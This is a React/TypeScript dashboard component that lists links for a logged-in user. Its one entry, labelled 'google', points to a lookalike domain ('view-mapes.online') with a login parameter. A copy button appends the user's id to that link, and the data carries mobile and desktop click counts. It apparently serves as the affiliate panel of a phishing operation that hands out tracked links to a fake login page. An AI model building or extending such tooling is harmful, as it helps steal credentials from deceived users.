
import { Copy } from "lucide-react";
import { handleCopyClick } from "../utils/copyToClipboard";
import { useAppSelector } from "../redux/hooks";

interface LinkItem {
  id: number;
  name: string;
  link: string;
  user: string;
  mobile: number;
  desktop: number;
}

const data: LinkItem[] = [
  {
    id: 1,
    name: "google",
    link: "https://location.view-mapes.online/live.html?type=login&",
    user: "Momin888",
    mobile: 0,
    desktop: 70,
  },
];

export default function NewPage() {
  const auth = useAppSelector((state: any) => state.auth);

 // ⬅ SAFE user extract

  console.log(auth.data.data, "amis");

  return (
    <div className="p-6">
      <div className="overflow-x-auto rounded-lg border border-gray-200">
        <table className="w-full text-left text-sm">
          <thead className="bg-gray-100 text-gray-600">
            <tr>
              <th className="px-4 py-3">#</th>
              <th className="px-4 py-3">Name</th>
              <th className="px-4 py-3">Link</th>
              <th className="px-4 py-3">User</th>
             
            </tr>
          </thead>

          <tbody>
            {data.map((item, index) => (
              <tr key={item.id} className="border-t">
                <td className="px-4 py-3 text-black">{index + 1}</td>

                {/* Name */}
                <td className="px-4 py-3">
                  <span className="px-3 py-1 text-xs rounded-full bg-gray-200 text-emerald-400">
                    {item.name}
                  </span>
                </td>

                {/* Link */}
                <td className="px-4 py-3 flex items-center gap-2">
                  <a
                    href={item.link}
                    className="text-blue-600 hover:underline truncate w-[220px]"
                  >
                    {item.link}
                  </a>

                  <Copy
                    size={16}
                    className="cursor-pointer text-gray-500"
                    onClick={() =>
                      handleCopyClick(
                        `${item.link}id=${auth?.data?.data?.id ?? ""}`
                      )
                    }
                  />
                </td>

                {/* User */}
                <td className="px-4 py-3 text-black">{auth.data.data.username}</td>

                {/* Mobile clicks */}
              
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
